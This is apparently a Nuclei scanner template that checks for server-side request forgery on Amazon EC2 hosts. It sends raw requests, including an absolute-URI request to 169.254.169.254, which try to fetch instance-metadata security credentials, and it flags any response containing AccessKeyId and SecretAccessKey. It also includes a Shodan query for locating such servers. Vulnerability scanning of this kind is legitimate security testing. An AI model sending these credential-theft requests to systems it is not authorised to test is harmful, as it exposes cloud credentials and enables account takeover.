http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - AccessKeyId
    - SecretAccessKey
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET {{BaseURL}}/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
    HTTP/1.1

    Host: {{Hostname}}


    '
  - '@tls-sni: {{Hostname}}

    GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
    HTTP/1.1

    Host: {{Hostname}}


    '
  stop-at-first-match: true
  unsafe: true
id: amazon-ec2-ssrf
info:
  author: DhiyaneshDk
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  description: SSRF vulnerability exists in Amazon EC2, or Amazon Elastic Compute
    Cloud which is a web service provided by Amazon Web Services (AWS) that offers
    resizable compute capacity in the cloud.
  metadata:
    max-request: 2
    shodan-query: 'Server: EC2ws'
    verified: true
  name: Amazon EC2 - Server-side request forgery (SSRF)
  severity: critical
  tags: aws,ec2,ssrf,amazon,vuln
